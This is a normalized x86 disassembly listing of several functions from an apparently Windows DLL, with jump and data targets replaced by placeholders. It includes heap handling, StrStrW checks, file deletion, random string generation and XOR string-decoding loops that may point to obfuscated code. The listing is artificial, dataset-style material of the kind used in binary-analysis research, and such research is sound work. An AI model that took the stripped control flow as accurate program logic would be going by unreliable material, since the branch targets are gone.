xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10055f98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
push 0x16
pop eax
pop ebp
retn
sub_10055fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082038
mov eax [ fs : 0x0 ]
push eax
sub esp 0x17c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
mov edi [ StrStrW@IAT ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x178 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x170 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x174 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x16c ] edx
mov edx [ ebp + 0x28 ]
mov [ ebp - 0x168 ] ecx
mov ecx [ ebp + 0x24 ]
mov [ ebp - 0x17c ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x188 ] edx
mov edx [ esi ]
mov [ ebp - 0x180 ] ecx
mov ecx [ ebp + 0x2c ]
push eax
push edx
mov [ ebp - 0x184 ] ecx
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x180 ]
mov ecx [ esi ]
push eax
push ecx
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x17c ]
mov ecx [ eax ]
mov edx [ ebp - 0x178 ]
mov eax [ edx ]
push ecx
mov ecx [ ebx ]
push eax
push ecx
lea esi [ ebp - 0x12c ]
call sub_1003d580
add esp 0xc
mov ecx [ ebp - 0x16c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10051390
cmp [ ebp - 0x118 ] 0x8
jb r-xdata
mov eax [ ebp - 0x188 ]
mov ecx [ esi ]
push eax
push ecx
call edi
test eax eax
je r-xdata
mov ebx [ ebp - 0x168 ]
mov edi ebx
call sub_10028de0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x12c ]
push edx
call sub_10065045
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x184 ]
mov ecx [ esi ]
push eax
push ecx
call edi
test eax eax
je r-xdata
mov edi [ ebp - 0x168 ]
call sub_10028de0
test eax eax
jne r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x13a
call sub_1001bb80
mov eax edx
lea edx [ eax + 0x2 ]
xor edi edi
lea edx [ ebp - 0x24 ]
lea eax [ edi + 0x69 ]
mov [ ebp - 0x168 ] edi
call sub_1001bb80
xor edx edx
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x148 ] dx
mov [ ebp - 0x134 ] 0x7
mov [ ebp - 0x138 ] edi
lea edx [ eax + 0x2 ]
mov edx [ ebp - 0x17c ]
mov eax [ edx ]
mov ecx [ ebp - 0x178 ]
mov edx [ ecx ]
push eax
mov eax [ ebx ]
push edx
push eax
lea esi [ ebp - 0x164 ]
call sub_1003d580
add esp 0xc
mov ecx [ ebp - 0x16c ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_10051390
mov ecx esi
call sub_10035d10
mov edi [ ebp - 0x168 ]
call sub_10028de0
test eax eax
jne r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x73
call sub_1001bb80
mov edx [ ebp - 0x16c ]
push edx
lea edx [ ebp - 0xa8 ]
call sub_10049460
jmp r-xdata
mov [ ebp - 0x168 ] eax
lea edx [ ebp - 0x24 ]
mov eax 0x48
call sub_1001bb80
push edx
lea ecx [ ebp - 0x148 ]
call sub_1004a800
push eax
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x3
mov edx [ eax ]
lea esi [ ebp - 0x12c ]
call sub_10045750
add esp 0x4
mov [ ebp - 0x4 ] 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp - 0x16c ]
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x110 ]
push edx
call sub_1005e3c0
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x148 ]
call sub_1005e3c0
mov edx [ ebp - 0x170 ]
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x1
mov edx [ edx ]
push ecx
lea esi [ ebp - 0x12c ]
call sub_10045750
add esp 0x4
mov esi 0x8
mov [ ebp - 0x4 ] 0x2
cmp [ eax + 0x14 ] esi
jb r-xdata
lea edx [ ebp - 0xb8 ]
mov eax 0xc7
call sub_1001bb80
mov ecx [ ebp - 0x16c ]
push ecx
call sub_10049460
jmp r-xdata
mov [ ebp - 0x168 ] eax
lea edx [ ebp - 0x24 ]
mov eax 0x2
call sub_1001bb80
push edx
lea ecx [ ebp - 0x148 ]
call sub_1004a800
push eax
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x5
mov edx [ eax ]
lea esi [ ebp - 0x12c ]
call sub_10045750
add esp 0x4
mov [ ebp - 0x4 ] 0x6
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0x174 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ edx ]
push ecx
mov ecx eax
mov edx edi
call sub_100133e0
add esp 0x8
test eax eax
lea ecx [ ebp - 0x12c ]
sete bl
call sub_10035d10
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10035d10
test bl bl
jne r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x174 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ edx ]
push ecx
mov ecx eax
mov edx ebx
call sub_10052ff0
add esp 0x8
test eax eax
sete bl
cmp [ ebp - 0x118 ] esi
jb r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x174 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ edx ]
push ecx
mov ecx eax
mov edx edi
call sub_10023060
add esp 0x8
test eax eax
lea ecx [ ebp - 0x12c ]
sete bl
call sub_10035d10
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10035d10
test bl bl
je r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x16c ]
push edx
mov edx [ ebp - 0x168 ]
call sub_10049460
mov eax [ ebp - 0x168 ]
push eax
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x73
call sub_1001bb80
mov ecx [ ebp - 0x16c ]
push ecx
call sub_10049460
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x118 ] 0x7
mov [ ebp - 0x11c ] edi
mov [ ebp - 0x12c ] ax
cmp [ ebp - 0x134 ] esi
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_10065045
add esp 0x4
lea edx [ ebp - 0xb8 ]
mov eax 0xc7
call sub_1001bb80
mov eax [ ebp - 0x16c ]
push eax
call sub_10049460
jmp r-xdata
mov edx [ ebp - 0x16c ]
mov esi [ ebp - 0x168 ]
push edx
mov edx esi
call sub_10049460
push esi
call [ SysFreeString@IAT ]
jmp r-xdata
test bl bl
je r-xdata
mov ecx [ ebp - 0x148 ]
push ecx
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x110 ]
mov eax 0x13a
call sub_1001bb80
mov ecx [ ebp - 0x16c ]
push ecx
call sub_10049460
jmp r-xdata
sub_100564c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
mov eax edi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10062fc5
dec edi
add esp 0x4
xor esi esi
mov ebx eax
test edi edi
jle r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor edx edx
mov [ ebx + eax * 2 - 0x2 ] dx
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
call sub_10028da1
xor edx edx
mov ecx 0x1a
div ecx
inc esi
add edx 0x61
mov [ ebx + esi * 2 - 0x2 ] dx
cmp esi edi
jl r-xdata
sub_1005651e
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10015235
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_100565bb
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_10024496
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_10078ac0
pop ecx
inc eax
jmp r-xdata
sub_10056660
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ebx ecx
lea ecx [ ebp - 0x220 ]
xor edi edi
push ecx
lea edx [ ebp - 0x218 ]
push edx
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x220 ] edi
call sub_10039230
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x220 ]
mov esi [ ebp - 0x218 ]
lea eax [ ebp - 0x21c ]
push eax
push ecx
push esi
lea ecx [ ebp - 0x228 ]
mov edx ebx
call sub_10061530
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x218 ]
mov eax 0xae
call sub_1001bb80
push edx
mov eax edx
push eax
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x224 ] 0x1
call sub_10024da0
test eax eax
jne r-xdata
cmp esi edi
je r-xdata
mov ebx [ HeapFree@IAT ]
cmp esi edi
je r-xdata
mov eax [ ebp - 0x228 ]
mov ecx [ ebp - 0x21c ]
push eax
push ecx
lea eax [ ebp - 0x214 ]
call sub_1000c170
add esp 0x8
mov [ ebp - 0x224 ] eax
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x21c ]
cmp eax edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp [ ebp - 0x224 ] edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
lea edx [ ebp - 0x214 ]
push edx
call sub_10068660
test eax eax
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x214 ]
push ecx
call [ DeleteFileW@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_10056814
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1003e1ac
pop ecx
call sub_10012991
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1006a460
push 0x1e
call sub_1005e59c
push 0xff
call sub_10017dcd
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_10012991
mov [ eax ] esi
push ebx
call sub_1003e1ac
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_10012991
mov [ eax ] esi
sub_100568b0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x40 ]
push ebx
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
cmp [ esi + 0x90 ] 0x8
jb r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edi 0x7
xor ecx ecx
mov [ esi + 0x90 ] edi
mov [ esi + 0x8c ] ebx
mov [ esi + 0x7c ] cx
cmp [ esi + 0x74 ] 0x8
jb r-xdata
mov eax [ esi + 0x7c ]
push eax
call sub_10065045
add esp 0x4
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor eax eax
mov [ esi + 0x74 ] edi
mov [ esi + 0x70 ] ebx
mov [ esi + 0x60 ] ax
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x60 ]
push edx
call sub_10065045
add esp 0x4
mov [ esi + 0x50 ] ebx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
cmp [ esi + 0x38 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ esi + 0x54 ]
push ecx
call sub_1005e020
mov edx [ esi + 0x50 ]
push edx
call sub_10065045
add esp 0x8
mov edi 0xf
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] ebx
mov [ esi + 0x24 ] bl
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_10065045
add esp 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] ebx
pop edi
mov [ esi + 0x8 ] bl
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x8 ]
push ecx
call sub_10065045
add esp 0x4
sub_10056990
push ebp
mov ebp esp
push 0xffffffff
push sub_10081bcf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff8b
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x3e ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x35
and edx 0xff
mov [ ebp + eax * 2 - 0x70 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff9f
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa6
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff95
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0x15
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x72 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x42
and edx 0xff
mov [ ebp + eax * 2 - 0x180 ] dx
inc eax
cmp eax 0x52
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xdc ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffee
and edx 0xff
mov [ ebp + eax * 2 - 0xd8 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
xor eax eax
push 0x2
lea esi [ ebp - 0x3dc ]
mov [ ebp - 0x9e ] ax
call sub_1003a620
add esp 0x4
mov edi eax
push 0xf
lea esi [ ebp - 0x414 ]
mov [ ebp - 0x4 ] ebx
call sub_1003a620
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x430 ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0x3a4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10021620
mov edi 0x8
cmp [ ebp - 0x41c ] edi
jb r-xdata
mov esi 0x7
xor edx edx
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x420 ] ebx
mov [ ebp - 0x430 ] dx
cmp [ ebp - 0x400 ] edi
jb r-xdata
mov ecx [ ebp - 0x430 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x400 ] esi
mov [ ebp - 0x404 ] ebx
mov [ ebp - 0x414 ] cx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3c8 ] edi
jb r-xdata
mov eax [ ebp - 0x414 ]
push eax
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x9c ]
xor eax eax
mov [ ebp - 0x3c8 ] esi
mov esi [ ebp - 0x394 ]
push ecx
mov [ ebp - 0x3cc ] ebx
mov [ ebp - 0x3dc ] ax
call [ lstrlenW@IAT ]
lea ebx [ eax + esi + 0x1 ]
mov esi [ GetProcessHeap@IAT ]
lea edx [ ebx + ebx ]
push edx
push edi
call esi
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x4b8 ] edi
test edi edi
je r-xdata
mov edx [ ebp - 0x3dc ]
push edx
call sub_10065045
add esp 0x4
cmp [ ebp - 0x390 ] 0x8
jb r-xdata
cmp [ ebp - 0x390 ] 0x8
mov eax [ ebp - 0x3a4 ]
jae r-xdata
xor eax eax
mov eax [ ebp - 0x3a4 ]
push eax
call sub_10065045
add esp 0x4
jmp r-xdata
push eax
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx ebx
mov ebx edi
call sub_100254a0
add esp 0x8
push 0x144
xor ebx ebx
push ebx
call esi
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4c0 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x3a4 ]
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x388 ]
push ebx
push ecx
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x388 ]
call sub_10044b20
test eax eax
je r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0x6
mov esi [ ebp - 0x4a4 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x6
push eax
lea ecx [ ebp - 0x4a8 ]
mov [ ebp - 0x4a8 ] ebx
mov [ ebp - 0x4a4 ] ebx
call sub_10028710
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x4a8 ] ebx
jne r-xdata
push 0x1
call sub_1005ac7e
add esp 0x4
push eax
lea ecx [ ebp - 0x4b0 ]
mov [ ebp - 0x4b0 ] ebx
mov [ ebp - 0x4ac ] ebx
call sub_100655d0
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x4b0 ] ebx
jne r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_100260d0
cmp [ ebp - 0x390 ] 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
lea eax [ ebp - 0x388 ]
push eax
lea esi [ ebp - 0x4a8 ]
call sub_10031da0
test eax eax
jne r-xdata
push edi
push ebx
call esi
jmp r-xdata
mov edx [ ebp - 0x3a4 ]
push edx
call sub_10065045
add esp 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
push edi
push ebx
call [ GetProcessHeap@IAT ]
mov esi [ ebp - 0x4a8 ]
mov eax esi
call sub_10005280
test eax eax
jne r-xdata
push eax
call [ HeapFree@IAT ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi + 0x128 ]
mov [ ebp - 0x4bc ] eax
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
lea esi [ ebp - 0x3f8 ]
call sub_1003a620
add esp 0x4
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0x3e8 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + esi + 0x1 ]
lea eax [ esi + esi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
mov ecx esi
call sub_100254a0
add esp 0x8
push ebx
lea ecx [ ebp - 0x4a0 ]
call sub_1004a800
mov [ ebp - 0x4b4 ] eax
push edi
lea ecx [ ebp - 0x484 ]
mov [ ebp - 0x4 ] 0xb
call sub_1004a800
push eax
lea edx [ ebp - 0x54 ]
lea esi [ ebp - 0x468 ]
mov [ ebp - 0x4 ] 0xc
call sub_10036350
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x4b4 ]
lea edi [ ebp - 0x44c ]
mov [ ebp - 0x4 ] 0xd
call sub_10021620
push eax
lea edx [ ebp - 0x24 ]
lea esi [ ebp - 0x3c0 ]
mov [ ebp - 0x4 ] 0xe
call sub_10045750
add esp 0x4
mov ecx edi
call sub_10035d10
lea ecx [ ebp - 0x468 ]
call sub_10035d10
lea ecx [ ebp - 0x484 ]
call sub_10035d10
lea ecx [ ebp - 0x4a0 ]
mov [ ebp - 0x4 ] 0x13
call sub_10035d10
mov eax [ ebp - 0x4b8 ]
mov edi [ GetProcessHeap@IAT ]
push eax
push 0x0
call edi
mov esi [ HeapFree@IAT ]
push eax
call esi
push ebx
push 0x0
call edi
push eax
call esi
nop
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x3f8 ]
call sub_10035d10
jmp r-xdata
lea ecx [ ebp - 0x3c0 ]
call sub_10035d10
lea ecx [ ebp - 0x3f8 ]
call sub_10035d10
jmp r-xdata
mov ecx [ ebp - 0x4cc ]
movzx edx [ ebp - 0x4c8 ]
mov eax [ ebp - 0x4c4 ]
push ecx
mov ecx [ ebp - 0x4c0 ]
push edx
mov edx [ ebp - 0x4b4 ]
push eax
push ecx
push edx
push ebx
lea eax [ ebp - 0x180 ]
push eax
mov ecx edi
mov ebx esi
call sub_100254a0
add esp 0x1c
lea ecx [ ebp - 0x3c0 ]
push ecx
mov edx esi
call sub_10054290
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0x4bc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4bc ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x4bc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edi [ eax + 0xc ]
mov ebx [ eax + 0x4 ]
mov esi [ lstrlenW@IAT ]
mov [ ebp - 0x4b4 ] edx
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
push ecx
mov [ ebp - 0x4c0 ] edi
mov [ ebp - 0x4c4 ] ecx
mov [ ebp - 0x4c8 ] edx
mov [ ebp - 0x4cc ] eax
call esi
push edi
mov edi eax
call esi
mov ecx [ ebp - 0x4b4 ]
push ecx
add edi eax
call esi
push ebx
add edi eax
call esi
lea edx [ ebp - 0x180 ]
push edx
add edi eax
call esi
lea edi [ eax + edi + 0x7 ]
lea eax [ edi + edi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x3c0 ]
push eax
lea edx [ ebp - 0x3c ]
call sub_10054290
push 0xffffffff
push 0x0
push rw-data
lea ecx [ ebp - 0x3c0 ]
call sub_1000c1e0
lea ecx [ ebp - 0x3c0 ]
push ecx
lea edx [ ebp - 0x70 ]
call sub_10054290
mov edx [ ebp - 0x3b0 ]
lea eax [ edx + edx + 0x2 ]
push eax
mov ebx 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c0 ]
cmp [ ebp - 0x3ac ] ebx
jae r-xdata
lea ecx [ ebp - 0x3c0 ]
call sub_10035d10
lea ecx [ ebp - 0x3f8 ]
call sub_10035d10
mov [ ebp - 0x4 ] bl
jmp r-xdata
push eax
push esi
call [ StrCpyW@IAT ]
lea ecx [ ebp - 0x3c0 ]
call sub_10035d10
lea ecx [ ebp - 0x3f8 ]
call sub_10035d10
lea eax [ ebp - 0x4b0 ]
mov [ ebp - 0x4 ] bl
call sub_100260d0
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_100260d0
lea ecx [ ebp - 0x3a4 ]
call sub_10035d10
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x3c0 ]
lea eax [ ebp - 0x4b0 ]
call sub_100260d0
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_100260d0
lea ecx [ ebp - 0x3a4 ]
call sub_10035d10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10057150
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_10057170
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x4 ]
cmp ebx [ ebp + 0xc ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edx [ ebx - 0x4 ]
lea esi [ ebx - 0x4 ]
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov eax ebx
sub eax esi
sar eax 0x2
add eax eax
add eax eax
push eax
mov ecx ebx
sub ecx eax
add ecx 0x4
push esi
push ecx
call sub_10077d10
add esp 0xc
mov [ esi ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] esi
